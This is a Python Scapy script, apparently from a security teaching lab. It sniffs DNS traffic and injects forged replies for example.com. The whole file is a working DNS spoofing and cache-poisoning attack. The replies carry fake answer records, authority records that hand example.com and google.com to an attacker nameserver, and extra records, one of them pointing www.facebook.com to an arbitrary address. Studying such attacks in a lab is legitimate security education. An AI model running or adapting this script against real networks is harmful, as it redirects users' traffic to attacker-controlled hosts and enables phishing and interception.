#!/usr/bin/env python3
from scapy.all import *
import sys
NS_NAME = "example.com"
def spoof_dns(pkt):
    if (DNS in pkt and NS_NAME in pkt[DNS].qd.qname.decode('utf-8')):
        print(pkt.sprintf("{DNS: %IP.src%--> %IP.dst%: %DNS.id%}"))
        ip = IP(src=pkt[IP].dst, dst=pkt[IP].src)
        # Create an IP object
        udp = UDP(sport = 53, dport=pkt[UDP].sport)
        # Create a UPD object
        Anssec = DNSRR(rrname=pkt[DNS].qd.qname, ttl=10, rdata="1.2.3.5")
        NSsec = DNSRR(rrname=NS_NAME, type='NS',ttl=259200, rdata='ns.attacker32.com')
        ns2 = DNSRR(rrname='google.com', type='NS', ttl=259200, rdata='ns.attacker32.com')
        
        add1 = DNSRR(rrname='ns.attacker32.com', type='A', ttl=259200, rdata='1.2.3.4')
        add2 = DNSRR(rrname='ns.example.net', type='A', ttl=259200, rdata='5.6.7.8')
        add3 = DNSRR(rrname='www.facebook.com', type='A', ttl=259200, rdata='3.4.5.6')
        # Create an aswer record
        dns = DNS(id=pkt[DNS].id, qr=1, aa=1, qd=pkt[DNS].qd, 
                  ancount=1 , nscount=2,arcount=3
                  ,an=Anssec,ns = NSsec/ns2,
                  ar=add1/add2/add3
                  )
        # Create a DNS object
        spoofpkt = ip/udp/dns # Assemble the spoofed DNS packet
        send(spoofpkt)
        
myFilter = "udp port 53"
# Set the filter
pkt=sniff(iface='br-34714aa0778c', filter=myFilter, prn=spoof_dns)